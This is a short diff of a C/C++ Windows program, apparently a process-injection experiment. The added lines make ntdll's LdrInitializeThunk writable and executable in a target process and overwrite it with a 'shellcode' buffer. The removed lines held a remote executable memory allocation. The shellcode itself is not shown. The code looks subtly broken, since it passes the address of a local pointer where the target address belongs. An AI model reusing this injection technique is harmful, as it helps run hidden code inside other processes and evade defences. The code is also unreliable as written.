@@ -75,14 +75,13 @@ int wmain()
 
 	void* moduleNtDll = GetModuleHandle("ntdll");
 	void* ldrInitThunk = GetProcAddress(moduleNtDll, "LdrInitializeThunk");
+	
+	DWORD oldProtect = 0;
+	status = ZwProtectVirtualMemory(hProcess, &ldrInitThunk, &size, PAGE_EXECUTE_READWRITE, &oldProtect);
+	wprintf(L"ZwProtectVirtualMemory: %d\n", status);
+	
+	status = ZwWriteVirtualMemory(hProcess, &ldrInitThunk, &shellcode, size, NULL);
+	wprintf(L"ZwWriteVirtualMemory: %d\n", status);
 
-	PVOID remoteAddr = NULL;
-	status = NtAllocateVirtualMemory(hProcess, &remoteAddr, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if(status)
-		wprintf(L"Error: %d", status);
-		return 0;
-	
-	wprintf(L"NtAllocateVirtualMemory: %d\n", status);
-	
 	return 0;
 }
